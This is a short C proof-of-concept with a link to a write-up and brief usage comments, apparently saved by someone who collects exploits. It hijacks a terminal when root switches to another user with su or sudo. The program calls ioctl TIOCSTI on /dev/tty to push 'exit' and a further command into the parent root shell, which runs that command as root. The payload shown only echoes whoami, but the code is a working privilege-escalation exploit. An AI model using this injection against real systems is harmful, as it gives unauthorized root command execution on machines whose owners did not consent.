// https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking
// su/sudo from root to another user allows TTY hijacking and arbitrary code execution
// Source: First written 2016-10-17; Last updated 2023-03-16



// manesec note: 
// frist must be run su or sudo to switch user.

// (root) # su mane
// (mane) $ 

// now send "exit; whoami" to /dev/tty

// (mane) $ exit;
// (root) # whoami
// root


#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
int main() {
    int fd = open("/dev/tty", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    char *x = "exit\necho Payload as `whoami`\n";
    while (*x != 0) {
        int ret = ioctl(fd, TIOCSTI, x);
        if (ret == -1) {
            perror("ioctl()");
        }
        x++;
    }
    return 0;
}